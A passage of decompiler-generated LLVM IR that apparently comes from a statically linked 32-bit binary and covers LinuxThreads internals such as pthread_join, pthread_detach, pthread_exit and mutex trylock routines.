  br i1 %v11_804e8cc, label %dec_label_pc_804e8c7.dec_label_pc_804e8ab_crit_edge, label %dec_label_pc_804e8d1

dec_label_pc_804e8c7.dec_label_pc_804e8ab_crit_edge: ; preds = %dec_label_pc_804e8c7
  %v0_804e8b6.pre = load i32, i32* @global_var_80626e4.143, align 4
  br label %dec_label_pc_804e8ab

dec_label_pc_804e8d1:                             ; preds = %dec_label_pc_804e8c7, %dec_label_pc_804e8ab
  %v0_804e8d1 = load i32, i32* @esi, align 4
  store i32 %v0_804e8d1, i32* @eax, align 4
  %v0_804e8d3 = call i32 @suspend.17()
  store i32 0, i32* %stack_var_-188, align 4
  %v1_804e8dd = call i32 @__GI_exit(i32 0)
  br label %dec_label_pc_804e8e2

dec_label_pc_804e8e2:                             ; preds = %dec_label_pc_804e896, %dec_label_pc_804e88c, %dec_label_pc_804e8d1
  store i32 0, i32* %stack_var_-188, align 4
  %v1_804e8e7 = call i32 @__GI__exit(i32 0)
  unreachable

; uselistorder directives
  uselistorder i32 %v0_804e8b6, { 1, 0 }
  uselistorder i32 %v0_804e88c, { 1, 0, 2 }
  uselistorder i32 %v3_804e86a, { 2, 1, 0 }
  uselistorder i32 %v0_804e86a, { 1, 0 }
  uselistorder i32 %v0_804e856, { 1, 0 }
  uselistorder i32 %v2_804e7f9, { 0, 2, 1 }
  uselistorder i32* %stack_var_-188, { 2, 3, 0, 4, 5, 6, 1, 7 }
  uselistorder i32* %stack_var_-156, { 1, 0 }
  uselistorder i32 (i32)* @__pthread_restart_new, { 1, 2, 5, 0, 4, 3 }
  uselistorder i32 428, { 2, 0, 1 }
  uselistorder i32 424, { 2, 0, 1 }
  uselistorder i32 416, { 2, 0, 1 }
  uselistorder i32 412, { 2, 0, 1 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder label %dec_label_pc_804e8e2, { 2, 0, 1 }
  uselistorder label %dec_label_pc_804e88c, { 1, 0 }
  uselistorder label %dec_label_pc_804e867, { 2, 0, 1 }
}

define i32 @pthread_exit(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_0 = alloca i32, align 4
  %v2_804e8ef = ptrtoint i32* %stack_var_0 to i32
  %v2_804e8f8 = call i32 @__pthread_do_exit(i32 %arg1, i32 %v2_804e8ef)
  ret i32 %v2_804e8f8
}

define i32 @pthread_join(i32 %arg1, i32* %arg2) local_unnamed_addr {
entry:
  %stack_var_-176 = alloca i32, align 4
  %stack_var_-28 = alloca i32, align 4
  %stack_var_-204 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v0_804e8ff = load i32, i32* @esi, align 4
  %v0_804e900 = load i32, i32* @ebx, align 4
  store i32 %v0_804e900, i32* %stack_var_-16, align 4
  %v4_804e900 = ptrtoint i32* %stack_var_-16 to i32
  %v2_804e907 = call i32 @thread_self.16(i32 %v0_804e900, i32 %v0_804e8ff)
  store i32 %arg1, i32* @ebp, align 4
  store i32 %v2_804e907, i32* @edx, align 4
  %v1_804e923 = urem i32 %arg1, 1024
  %v2_804e933 = mul nuw nsw i32 %v1_804e923, 16
  %v1_804e936 = add i32 %v2_804e933, ptrtoint (i32* @global_var_805e300.147 to i32)
  store i32 %v1_804e936, i32* @esi, align 4
  store i32 %v1_804e936, i32* @eax, align 4
  store i32 %v1_804e936, i32* %stack_var_-28, align 4
  %v1_804e945 = call i32 @__pthread_lock(i32 %v1_804e936)
  %v0_804e94a = load i32, i32* @esi, align 4
  %v1_804e94a = add i32 %v0_804e94a, 8
  %v2_804e94a = inttoptr i32 %v1_804e94a to i32*
  %v3_804e94a = load i32, i32* %v2_804e94a, align 4
  store i32 %v3_804e94a, i32* @ebx, align 4
  %v1_804e94d = icmp eq i32 %v3_804e94a, 0
  br i1 %v1_804e94d, label %dec_label_pc_804e956, label %dec_label_pc_804e951

dec_label_pc_804e951:                             ; preds = %entry
  %v1_804e951 = add i32 %v3_804e94a, 16
  %v2_804e951 = inttoptr i32 %v1_804e951 to i32*
  %v3_804e951 = load i32, i32* %v2_804e951, align 4
  %v4_804e951 = load i32, i32* @ebp, align 4
  %v15_804e951 = icmp eq i32 %v3_804e951, %v4_804e951
  br i1 %v15_804e951, label %dec_label_pc_804e966, label %dec_label_pc_804e956

dec_label_pc_804e956:                             ; preds = %dec_label_pc_804e951, %entry
  store i32 %v0_804e94a, i32* %stack_var_-204, align 4
  %v1_804e95a = inttoptr i32 %v0_804e94a to i32*
  %v2_804e95a = call i32 @__pthread_unlock(i32* %v1_804e95a)
  br label %dec_label_pc_804e97f

dec_label_pc_804e966:                             ; preds = %dec_label_pc_804e951
  %v12_804e96d = icmp eq i32 %v3_804e94a, %v2_804e907
  %v1_804e96f = icmp eq i1 %v12_804e96d, false
  br i1 %v1_804e96f, label %dec_label_pc_804e987, label %dec_label_pc_804e971

dec_label_pc_804e971:                             ; preds = %dec_label_pc_804e966
  store i32 %v0_804e94a, i32* %stack_var_-204, align 4
  %v1_804e975 = inttoptr i32 %v0_804e94a to i32*
  %v2_804e975 = call i32 @__pthread_unlock(i32* %v1_804e975)
  br label %dec_label_pc_804e97f

dec_label_pc_804e97f:                             ; preds = %dec_label_pc_804e993, %dec_label_pc_804e956, %dec_label_pc_804e971
  %v0_804eae34 = phi i32 [ 22, %dec_label_pc_804e993 ], [ 3, %dec_label_pc_804e956 ], [ 35, %dec_label_pc_804e971 ]
  br label %dec_label_pc_804ead9

dec_label_pc_804e987:                             ; preds = %dec_label_pc_804e966
  %v1_804e987 = add i32 %v3_804e94a, 45
  %v2_804e987 = inttoptr i32 %v1_804e987 to i8*
  %v3_804e987 = load i8, i8* %v2_804e987, align 1
  %v4_804e987 = icmp eq i8 %v3_804e987, 0
  %v1_804e98b = icmp eq i1 %v4_804e987, false
  br i1 %v1_804e98b, label %dec_label_pc_804e993, label %dec_label_pc_804e98d

dec_label_pc_804e98d:                             ; preds = %dec_label_pc_804e987
  %v1_804e98d = add i32 %v3_804e94a, 56
  %v2_804e98d = inttoptr i32 %v1_804e98d to i32*
  %v3_804e98d = load i32, i32* %v2_804e98d, align 4
  %v4_804e98d = icmp eq i32 %v3_804e98d, 0
  br i1 %v4_804e98d, label %dec_label_pc_804e9a3, label %dec_label_pc_804e993

dec_label_pc_804e993:                             ; preds = %dec_label_pc_804e98d, %dec_label_pc_804e987
  store i32 %v0_804e94a, i32* %stack_var_-204, align 4
  %v1_804e997 = inttoptr i32 %v0_804e94a to i32*
  %v2_804e997 = call i32 @__pthread_unlock(i32* %v1_804e997)
  br label %dec_label_pc_804e97f

dec_label_pc_804e9a3:                             ; preds = %dec_label_pc_804e98d
  %v1_804e9a3 = add i32 %v3_804e94a, 44
  %v2_804e9a3 = inttoptr i32 %v1_804e9a3 to i8*
  %v3_804e9a3 = load i8, i8* %v2_804e9a3, align 1
  %v4_804e9a3 = icmp eq i8 %v3_804e9a3, 0
  %v1_804e9a7 = icmp eq i1 %v4_804e9a3, false
  br i1 %v1_804e9a7, label %dec_label_pc_804ea6f, label %dec_label_pc_804e9ad

dec_label_pc_804e9ad:                             ; preds = %dec_label_pc_804e9a3
  store i32 %v2_804e907, i32* @eax, align 4
  %v2_804e9b4 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804e9b4, i32* @edx, align 4
  %v0_804e9bb = call i32 @__pthread_set_own_extricate_if.15()
  %v1_804e9c7 = add i32 %v2_804e907, 66
  %v2_804e9c7 = inttoptr i32 %v1_804e9c7 to i8*
  %v3_804e9c7 = load i8, i8* %v2_804e9c7, align 1
  %v4_804e9c7 = icmp eq i8 %v3_804e9c7, 0
  br i1 %v4_804e9c7, label %dec_label_pc_804e9df, label %dec_label_pc_804e9cd

dec_label_pc_804e9cd:                             ; preds = %dec_label_pc_804e9ad
  store i32 1, i32* @edi, align 4
  %v1_804e9d9 = add i32 %v2_804e907, 64
  %v2_804e9d9 = inttoptr i32 %v1_804e9d9 to i8*
  %v3_804e9d9 = load i8, i8* %v2_804e9d9, align 1
  %v4_804e9d9 = icmp eq i8 %v3_804e9d9, 0
  br i1 %v4_804e9d9, label %dec_label_pc_804e9eb, label %dec_label_pc_804e9df

dec_label_pc_804e9df:                             ; preds = %dec_label_pc_804e9cd, %dec_label_pc_804e9ad
  store i32 0, i32* @edi, align 4
  store i32 %v2_804e907, i32* %v2_804e98d, align 4
  br label %dec_label_pc_804e9eb

dec_label_pc_804e9eb:                             ; preds = %dec_label_pc_804e9cd, %dec_label_pc_804e9df
  %v0_804e9ee = load i32, i32* @esi, align 4
  store i32 %v0_804e9ee, i32* %stack_var_-204, align 4
  %v1_804e9ef = inttoptr i32 %v0_804e9ee to i32*
  %v2_804e9ef = call i32 @__pthread_unlock(i32* %v1_804e9ef)
  %v0_804e9f7 = load i32, i32* @edi, align 4
  %v1_804e9f7 = icmp eq i32 %v0_804e9f7, 0
  store i32 %v2_804e907, i32* @eax, align 4
  br i1 %v1_804e9f7, label %dec_label_pc_804ea0b, label %dec_label_pc_804e9fb

dec_label_pc_804e9fb:                             ; preds = %dec_label_pc_804e9eb
  store i32 0, i32* @edx, align 4
  %v0_804ea04 = call i32 @__pthread_set_own_extricate_if.15()
  br label %dec_label_pc_804ea50

dec_label_pc_804ea0b:                             ; preds = %dec_label_pc_804e9eb
  %v0_804ea12 = call i32 @suspend.17()
  store i32 %v2_804e907, i32* @eax, align 4
  store i32 0, i32* @edx, align 4
  %v0_804ea20 = call i32 @__pthread_set_own_extricate_if.15()
  %v1_804ea2c = add i32 %v2_804e907, 440
  %v2_804ea2c = inttoptr i32 %v1_804ea2c to i8*
  %v3_804ea2c = load i8, i8* %v2_804ea2c, align 1
  %v4_804ea2c = icmp eq i8 %v3_804ea2c, 0
  br i1 %v4_804ea2c, label %dec_label_pc_804ea61, label %dec_label_pc_804ea35

dec_label_pc_804ea35:                             ; preds = %dec_label_pc_804ea0b
  %v1_804ea3c = add i32 %v2_804e907, 64
  %v2_804ea3c = inttoptr i32 %v1_804ea3c to i8*
  %v3_804ea3c = load i8, i8* %v2_804ea3c, align 1
  %v4_804ea3c = icmp eq i8 %v3_804ea3c, 0
  %v1_804ea40 = icmp eq i1 %v4_804ea3c, false
  br i1 %v1_804ea40, label %dec_label_pc_804ea61, label %dec_label_pc_804ea42

dec_label_pc_804ea42:                             ; preds = %dec_label_pc_804ea35
  store i8 0, i8* %v2_804ea2c, align 1
  br label %dec_label_pc_804ea50

dec_label_pc_804ea50:                             ; preds = %dec_label_pc_804e9fb, %dec_label_pc_804ea42
  store i32 -1, i32* %stack_var_-204, align 4
  %v2_804ea5c = call i32 @__pthread_do_exit(i32 -1, i32 %v4_804e900)
  br label %dec_label_pc_804ea61

dec_label_pc_804ea61:                             ; preds = %dec_label_pc_804ea35, %dec_label_pc_804ea0b, %dec_label_pc_804ea50
  store i32 %v2_804e907, i32* @edx, align 4
  %v0_804ea68 = load i32, i32* @esi, align 4
  store i32 %v0_804ea68, i32* @eax, align 4
  %v0_804ea6a = load i32, i32* %stack_var_-204, align 4
  %v1_804ea6a = call i32 @__pthread_lock(i32 %v0_804ea6a)
  br label %dec_label_pc_804ea6f

dec_label_pc_804ea6f:                             ; preds = %dec_label_pc_804e9a3, %dec_label_pc_804ea61
  %v4_804ea6f = icmp eq i32* %arg2, null
  br i1 %v4_804ea6f, label %dec_label_pc_804ea85, label %dec_label_pc_804ea79

dec_label_pc_804ea79:                             ; preds = %dec_label_pc_804ea6f
  %v1_804ea80 = add i32 %v3_804e94a, 48
  %v2_804ea80 = inttoptr i32 %v1_804ea80 to i32*
  %v3_804ea80 = load i32, i32* %v2_804ea80, align 4
  store i32 %v3_804ea80, i32* %arg2, align 4
  br label %dec_label_pc_804ea85

dec_label_pc_804ea85:                             ; preds = %dec_label_pc_804ea6f, %dec_label_pc_804ea79
  %v0_804ea88 = load i32, i32* @esi, align 4
  store i32 %v0_804ea88, i32* %stack_var_-204, align 4
  %v1_804ea89 = inttoptr i32 %v0_804ea88 to i32*
  %v2_804ea89 = call i32 @__pthread_unlock(i32* %v1_804ea89)
  %v0_804ea91 = load i32, i32* @global_var_80626e4.143, align 4
  %v2_804ea91 = icmp slt i32 %v0_804ea91, 0
  br i1 %v2_804ea91, label %dec_label_pc_804ead7, label %dec_label_pc_804ea9a

dec_label_pc_804ea9a:                             ; preds = %dec_label_pc_804ea85
  store i32 %v2_804e907, i32* %stack_var_-176, align 4
  %v2_804eab1 = ptrtoint i32* %stack_var_-176 to i32
  br label %dec_label_pc_804eab1

dec_label_pc_804eab1:                             ; preds = %dec_label_pc_804eacd.dec_label_pc_804eab1_crit_edge, %dec_label_pc_804ea9a
  %v0_804eabc = phi i32 [ %v0_804eabc.pre, %dec_label_pc_804eacd.dec_label_pc_804eab1_crit_edge ], [ %v0_804ea91, %dec_label_pc_804ea9a ]
  store i32 %v0_804eabc, i32* %stack_var_-204, align 4
  %v3_804eac2 = call i32 @__libc_write(i32 %v0_804eabc, i32 %v2_804eab1, i32 148)
  %v8_804eaca = icmp eq i32 %v3_804eac2, -1
  %v1_804eacb = icmp eq i1 %v8_804eaca, false
  br i1 %v1_804eacb, label %dec_label_pc_804ead7, label %dec_label_pc_804eacd

dec_label_pc_804eacd:                             ; preds = %dec_label_pc_804eab1
  %v0_804eacd = load i32, i32* %stack_var_-204, align 4
  %v1_804eacd = call i32 @__errno_location(i32 %v0_804eacd)
  %v1_804ead2 = inttoptr i32 %v1_804eacd to i32*
  %v2_804ead2 = load i32, i32* %v1_804ead2, align 4
  %v11_804ead2 = icmp eq i32 %v2_804ead2, 4
  br i1 %v11_804ead2, label %dec_label_pc_804eacd.dec_label_pc_804eab1_crit_edge, label %dec_label_pc_804eacd.dec_label_pc_804ead7.loopexit_crit_edge

dec_label_pc_804eacd.dec_label_pc_804ead7.loopexit_crit_edge: ; preds = %dec_label_pc_804eacd
  br label %dec_label_pc_804ead7

dec_label_pc_804eacd.dec_label_pc_804eab1_crit_edge: ; preds = %dec_label_pc_804eacd
  %v0_804eabc.pre = load i32, i32* @global_var_80626e4.143, align 4
  br label %dec_label_pc_804eab1

dec_label_pc_804ead7:                             ; preds = %dec_label_pc_804eab1, %dec_label_pc_804eacd.dec_label_pc_804ead7.loopexit_crit_edge, %dec_label_pc_804ea85
  br label %dec_label_pc_804ead9

dec_label_pc_804ead9:                             ; preds = %dec_label_pc_804e97f, %dec_label_pc_804ead7
  %v0_804eae3 = phi i32 [ %v0_804eae34, %dec_label_pc_804e97f ], [ 0, %dec_label_pc_804ead7 ]
  ret i32 %v0_804eae3

; uselistorder directives
  uselistorder i32 %v0_804eabc, { 1, 0 }
  uselistorder i32 %v3_804e94a, { 1, 4, 3, 5, 0, 2, 6, 7 }
  uselistorder i32 %v0_804e94a, { 3, 2, 5, 4, 1, 0, 6 }
  uselistorder i32 %v2_804e907, { 10, 4, 3, 5, 7, 6, 1, 2, 9, 8, 0, 11 }
  uselistorder i32* %stack_var_-16, { 1, 0 }
  uselistorder i32* %stack_var_-204, { 0, 2, 3, 1, 4, 5, 6, 7, 8 }
  uselistorder i32* %stack_var_-28, { 1, 0 }
  uselistorder i32* %stack_var_-176, { 1, 0 }
  uselistorder i32 (i32, i32)* @__pthread_do_exit, { 2, 1, 4, 9, 8, 0, 7, 3, 11, 6, 5, 10 }
  uselistorder i32 440, { 6, 5, 0, 1, 2, 3, 4 }
  uselistorder i32 ()* @suspend.17, { 1, 0 }
  uselistorder i32 ()* @__pthread_set_own_extricate_if.15, { 2, 1, 0 }
  uselistorder label %dec_label_pc_804ead9, { 1, 0 }
  uselistorder label %dec_label_pc_804ead7, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804ea85, { 1, 0 }
  uselistorder label %dec_label_pc_804ea6f, { 1, 0 }
  uselistorder label %dec_label_pc_804ea61, { 2, 0, 1 }
  uselistorder label %dec_label_pc_804ea50, { 1, 0 }
  uselistorder label %dec_label_pc_804e9eb, { 1, 0 }
  uselistorder label %dec_label_pc_804e97f, { 0, 2, 1 }
}

define i32 @pthread_detach(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-160 = alloca i32, align 4
  %stack_var_-188 = alloca i32, align 4
  %stack_var_-184 = alloca i32, align 4
  %v0_804eae6 = load i32, i32* @ebx, align 4
  store i32 0, i32* @edx, align 4
  store i32 %arg1, i32* @edi, align 4
  %v1_804eaf8 = urem i32 %arg1, 1024
  %v2_804eafd = mul nuw nsw i32 %v1_804eaf8, 16
  %v1_804eb00 = add i32 %v2_804eafd, ptrtoint (i32* @global_var_805e300.147 to i32)
  store i32 %v1_804eb00, i32* @esi, align 4
  store i32 %v1_804eb00, i32* @eax, align 4
  %v1_804eb08 = call i32 @__pthread_lock(i32 %v0_804eae6)
  %v0_804eb0d = load i32, i32* @esi, align 4
  %v1_804eb0d = add i32 %v0_804eb0d, 8
  %v2_804eb0d = inttoptr i32 %v1_804eb0d to i32*
  %v3_804eb0d = load i32, i32* %v2_804eb0d, align 4
  %v1_804eb10 = icmp eq i32 %v3_804eb0d, 0
  br i1 %v1_804eb10, label %dec_label_pc_804eb19, label %dec_label_pc_804eb14

dec_label_pc_804eb14:                             ; preds = %entry
  %v1_804eb14 = add i32 %v3_804eb0d, 16
  %v2_804eb14 = inttoptr i32 %v1_804eb14 to i32*
  %v3_804eb14 = load i32, i32* %v2_804eb14, align 4
  %v4_804eb14 = load i32, i32* @edi, align 4
  %v15_804eb14 = icmp eq i32 %v3_804eb14, %v4_804eb14
  br i1 %v15_804eb14, label %dec_label_pc_804eb29, label %dec_label_pc_804eb19

dec_label_pc_804eb19:                             ; preds = %dec_label_pc_804eb14, %entry
  store i32 %v0_804eb0d, i32* %stack_var_-188, align 4
  %v1_804eb1d = inttoptr i32 %v0_804eb0d to i32*
  %v2_804eb1d = call i32 @__pthread_unlock(i32* %v1_804eb1d)
  br label %dec_label_pc_804eb3d

dec_label_pc_804eb29:                             ; preds = %dec_label_pc_804eb14
  %v1_804eb29 = add i32 %v3_804eb0d, 45
  %v2_804eb29 = inttoptr i32 %v1_804eb29 to i8*
  %v3_804eb29 = load i8, i8* %v2_804eb29, align 1
  %v4_804eb29 = icmp eq i8 %v3_804eb29, 0
  br i1 %v4_804eb29, label %dec_label_pc_804eb42, label %dec_label_pc_804eb2f

dec_label_pc_804eb2f:                             ; preds = %dec_label_pc_804eb29
  store i32 %v0_804eb0d, i32* %stack_var_-188, align 4
  %v1_804eb33 = inttoptr i32 %v0_804eb0d to i32*
  %v2_804eb33 = call i32 @__pthread_unlock(i32* %v1_804eb33)
  br label %dec_label_pc_804eb3d

dec_label_pc_804eb3d:                             ; preds = %dec_label_pc_804eb48, %dec_label_pc_804eb19, %dec_label_pc_804eb2f
  %v0_804ebbc3 = phi i32 [ 0, %dec_label_pc_804eb48 ], [ 3, %dec_label_pc_804eb19 ], [ 22, %dec_label_pc_804eb2f ]
  br label %dec_label_pc_804ebb3

dec_label_pc_804eb42:                             ; preds = %dec_label_pc_804eb29
  %v1_804eb42 = add i32 %v3_804eb0d, 56
  %v2_804eb42 = inttoptr i32 %v1_804eb42 to i32*
  %v3_804eb42 = load i32, i32* %v2_804eb42, align 4
  %v4_804eb42 = icmp eq i32 %v3_804eb42, 0
  br i1 %v4_804eb42, label %dec_label_pc_804eb55, label %dec_label_pc_804eb48

dec_label_pc_804eb48:                             ; preds = %dec_label_pc_804eb42
  store i32 %v0_804eb0d, i32* %stack_var_-188, align 4
  %v1_804eb4c = inttoptr i32 %v0_804eb0d to i32*
  %v2_804eb4c = call i32 @__pthread_unlock(i32* %v1_804eb4c)
  br label %dec_label_pc_804eb3d

dec_label_pc_804eb55:                             ; preds = %dec_label_pc_804eb42
  store i8 1, i8* %v2_804eb29, align 1
  %v1_804eb5c = add i32 %v3_804eb0d, 44
  %v2_804eb5c = inttoptr i32 %v1_804eb5c to i8*
  %v3_804eb5c = load i8, i8* %v2_804eb5c, align 1
  %v4_804eb5c = sext i8 %v3_804eb5c to i32
  store i32 %v4_804eb5c, i32* @ebx, align 4
  %v0_804eb60 = load i32, i32* @esi, align 4
  store i32 %v0_804eb60, i32* %stack_var_-188, align 4
  %v1_804eb61 = inttoptr i32 %v0_804eb60 to i32*
  %v2_804eb61 = call i32 @__pthread_unlock(i32* %v1_804eb61)
  %v1_804eb69 = icmp eq i8 %v3_804eb5c, 0
  br i1 %v1_804eb69, label %dec_label_pc_804ebb1, label %dec_label_pc_804eb6d

dec_label_pc_804eb6d:                             ; preds = %dec_label_pc_804eb55
  %v0_804eb6d = load i32, i32* @global_var_80626e4.143, align 4
  %v2_804eb6d = icmp slt i32 %v0_804eb6d, 0
  br i1 %v2_804eb6d, label %dec_label_pc_804ebb1, label %dec_label_pc_804eb76

dec_label_pc_804eb76:                             ; preds = %dec_label_pc_804eb6d
  %v0_804eb76 = load i32, i32* %stack_var_-188, align 4
  %v1_804eb76 = load i32, i32* %stack_var_-184, align 4
  %v2_804eb76 = call i32 @thread_self.16(i32 %v0_804eb76, i32 %v1_804eb76)
  store i32 %v2_804eb76, i32* %stack_var_-160, align 4
  %v2_804eb8b = ptrtoint i32* %stack_var_-160 to i32
  br label %dec_label_pc_804eb8b

dec_label_pc_804eb8b:                             ; preds = %dec_label_pc_804eba7, %dec_label_pc_804eb76
  store i32 %v2_804eb8b, i32* %stack_var_-184, align 4
  %v0_804eb96 = load i32, i32* @global_var_80626e4.143, align 4
  store i32 %v0_804eb96, i32* %stack_var_-188, align 4
  %v3_804eb9c = call i32 @__libc_write(i32 %v0_804eb96, i32 %v2_804eb8b, i32 148)
  %v8_804eba4 = icmp eq i32 %v3_804eb9c, -1
  %v1_804eba5 = icmp eq i1 %v8_804eba4, false
  br i1 %v1_804eba5, label %dec_label_pc_804ebb1, label %dec_label_pc_804eba7

dec_label_pc_804eba7:                             ; preds = %dec_label_pc_804eb8b
  %v0_804eba7 = load i32, i32* %stack_var_-188, align 4
  %v1_804eba7 = call i32 @__errno_location(i32 %v0_804eba7)
  %v1_804ebac = inttoptr i32 %v1_804eba7 to i32*
  %v2_804ebac = load i32, i32* %v1_804ebac, align 4
  %v11_804ebac = icmp eq i32 %v2_804ebac, 4
  br i1 %v11_804ebac, label %dec_label_pc_804eb8b, label %dec_label_pc_804eba7.dec_label_pc_804ebb1.loopexit_crit_edge

dec_label_pc_804eba7.dec_label_pc_804ebb1.loopexit_crit_edge: ; preds = %dec_label_pc_804eba7
  br label %dec_label_pc_804ebb1

dec_label_pc_804ebb1:                             ; preds = %dec_label_pc_804eb8b, %dec_label_pc_804eba7.dec_label_pc_804ebb1.loopexit_crit_edge, %dec_label_pc_804eb6d, %dec_label_pc_804eb55
  br label %dec_label_pc_804ebb3

dec_label_pc_804ebb3:                             ; preds = %dec_label_pc_804eb3d, %dec_label_pc_804ebb1
  %v0_804ebbc = phi i32 [ %v0_804ebbc3, %dec_label_pc_804eb3d ], [ 0, %dec_label_pc_804ebb1 ]
  ret i32 %v0_804ebbc

; uselistorder directives
  uselistorder i32 %v3_804eb0d, { 3, 2, 1, 0, 4 }
  uselistorder i32 %v0_804eb0d, { 3, 2, 5, 4, 1, 0, 6 }
  uselistorder i32* %stack_var_-184, { 1, 0 }
  uselistorder i32* %stack_var_-188, { 0, 2, 1, 3, 4, 5, 6 }
  uselistorder i32* %stack_var_-160, { 1, 0 }
  uselistorder i32 (i32, i32)* @thread_self.16, { 2, 1, 0, 3 }
  uselistorder label %dec_label_pc_804ebb3, { 1, 0 }
  uselistorder label %dec_label_pc_804ebb1, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_804eb3d, { 0, 2, 1 }
}

define i32 @__fresetlockfiles() local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v2_804ebc4 = ptrtoint i32* %stack_var_-8 to i32
  store i32 %v2_804ebc4, i32* %ebx.global-to-local, align 4
  %v2_804ebc9 = call i32 @pthread_mutexattr_init(i32* nonnull %stack_var_-8)
  %v3_804ebd3 = call i32 @__pthread_mutexattr_setkind_np(i32* nonnull %stack_var_-8, i32 1)
  %storemerge8 = load i32, i32* bitcast (i32** @global_var_80627dc.184 to i32*), align 4
  store i32 %storemerge8, i32* %ebx.global-to-local, align 4
  %v1_804ebf29 = icmp eq i32 %storemerge8, 0
  %v1_804ebf810 = icmp eq i1 %v1_804ebf29, false
  br i1 %v1_804ebf810, label %dec_label_pc_804ebe0, label %dec_label_pc_804ebfa

dec_label_pc_804ebe0:                             ; preds = %entry, %dec_label_pc_804ebe0
  %storemerge11 = phi i32 [ %storemerge, %dec_label_pc_804ebe0 ], [ %storemerge8, %entry ]
  %v1_804ebe3 = add i32 %storemerge11, 56
  %v3_804ebe7 = call i32 @pthread_mutex_init(i32 %v1_804ebe3, i32* nonnull %stack_var_-8)
  %v0_804ebec = load i32, i32* %ebx.global-to-local, align 4
  %v1_804ebec = add i32 %v0_804ebec, 32
  %v2_804ebec = inttoptr i32 %v1_804ebec to i32*
  %storemerge = load i32, i32* %v2_804ebec, align 4
  store i32 %storemerge, i32* %ebx.global-to-local, align 4
  %v1_804ebf2 = icmp eq i32 %storemerge, 0
  %v1_804ebf8 = icmp eq i1 %v1_804ebf2, false
  br i1 %v1_804ebf8, label %dec_label_pc_804ebe0, label %dec_label_pc_804ebfa

dec_label_pc_804ebfa:                             ; preds = %dec_label_pc_804ebe0, %entry
  %v1_804ebfe = call i32 @pthread_mutexattr_destroy(i32 %v2_804ebc4)
  ret i32 %v1_804ebfe

; uselistorder directives
  uselistorder i32 %storemerge, { 1, 2, 0 }
  uselistorder i32* %ebx.global-to-local, { 2, 1, 0, 3 }
  uselistorder i32 (i32)* @pthread_mutexattr_destroy, { 2, 1, 0 }
  uselistorder label %dec_label_pc_804ebe0, { 1, 0 }
}

define i32 @__pthread_trylock(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %ecx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_804ec08 = load i32, i32* @ebx, align 4
  store i32 %v0_804ec08, i32* %stack_var_-4, align 4
  %v0_804ec09 = load i32, i32* @eax, align 4
  store i32 %v0_804ec09, i32* %ecx.global-to-local, align 4
  %v1_804ec0e10 = inttoptr i32 %v0_804ec09 to i32*
  %v2_804ec0e11 = load i32, i32* %v1_804ec0e10, align 4
  %v3_804ec0e12 = icmp eq i32 %v2_804ec0e11, 0
  br i1 %v3_804ec0e12, label %dec_label_pc_804ec1a, label %dec_label_pc_804ec30

dec_label_pc_804ec1a:                             ; preds = %entry, %dec_label_pc_804ec1a.dec_label_pc_804ec0e_crit_edge
  %v1_804ec0e13 = phi i32* [ %v1_804ec0e, %dec_label_pc_804ec1a.dec_label_pc_804ec0e_crit_edge ], [ %v1_804ec0e10, %entry ]
  store i32 0, i32* %edx.global-to-local, align 4
  %v2_804ec23 = load i32, i32* %v1_804ec0e13, align 4
  %v15_804ec23 = icmp eq i32 %v2_804ec23, 0
  %v22_804ec23 = select i1 %v15_804ec23, i32 1, i32 %v2_804ec23
  store i32 %v22_804ec23, i32* %v1_804ec0e13, align 4
  %v1_804ec27 = zext i1 %v15_804ec23 to i32
  %v2_804ec27 = load i32, i32* %edx.global-to-local, align 4
  %v3_804ec27 = and i32 %v2_804ec27, -256
  %v4_804ec27 = or i32 %v3_804ec27, %v1_804ec27
  store i32 %v4_804ec27, i32* %edx.global-to-local, align 4
  %v4_804ec2a = icmp eq i1 %v15_804ec23, false
  br i1 %v4_804ec2a, label %dec_label_pc_804ec1a.dec_label_pc_804ec0e_crit_edge, label %dec_label_pc_804ec2e

dec_label_pc_804ec1a.dec_label_pc_804ec0e_crit_edge: ; preds = %dec_label_pc_804ec1a
  %v0_804ec0e.pre = load i32, i32* %ecx.global-to-local, align 4
  %v1_804ec0e = inttoptr i32 %v0_804ec0e.pre to i32*
  %v2_804ec0e = load i32, i32* %v1_804ec0e, align 4
  %v3_804ec0e = icmp eq i32 %v2_804ec0e, 0
  br i1 %v3_804ec0e, label %dec_label_pc_804ec1a, label %dec_label_pc_804ec30

dec_label_pc_804ec2e:                             ; preds = %dec_label_pc_804ec1a
  br label %dec_label_pc_804ec30

dec_label_pc_804ec30:                             ; preds = %entry, %dec_label_pc_804ec1a.dec_label_pc_804ec0e_crit_edge, %dec_label_pc_804ec2e
  %storemerge = phi i32 [ 0, %dec_label_pc_804ec2e ], [ 16, %dec_label_pc_804ec1a.dec_label_pc_804ec0e_crit_edge ], [ 16, %entry ]
  %v2_804ec30 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_804ec30, i32* @edx, align 4
  %v2_804ec31 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_804ec31, i32* @ebx, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32* %v1_804ec0e, { 1, 0 }
  uselistorder i1 %v15_804ec23, { 1, 0, 2 }
  uselistorder i32 %v2_804ec23, { 1, 0 }
  uselistorder i32* %v1_804ec0e13, { 1, 0 }
  uselistorder label %dec_label_pc_804ec30, { 2, 1, 0 }
  uselistorder label %dec_label_pc_804ec1a, { 1, 0 }
}

define i32 @__pthread_alt_trylock(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %ecx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_804ec33 = load i32, i32* @ebx, align 4
  store i32 %v0_804ec33, i32* %stack_var_-4, align 4
  %v0_804ec34 = load i32, i32* @eax, align 4
  store i32 %v0_804ec34, i32* %ecx.global-to-local, align 4
  %v1_804ec3910 = inttoptr i32 %v0_804ec34 to i32*
